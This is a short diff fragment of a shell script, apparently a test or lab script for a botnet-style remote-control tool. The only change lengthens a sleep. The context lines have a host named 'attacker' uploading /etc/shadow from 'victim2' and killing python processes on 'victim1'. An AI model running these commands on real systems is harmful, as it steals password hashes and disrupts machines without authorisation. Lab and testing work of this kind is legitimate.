@@ -29,7 +29,7 @@ sleep 2
 
 ssh attacker "byossh -t 10 victim2 upload /etc/shadow"
 
-sleep 2
+sleep 5
 
 # Kill byob on client via byob
 ssh attacker "byossh victim1 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
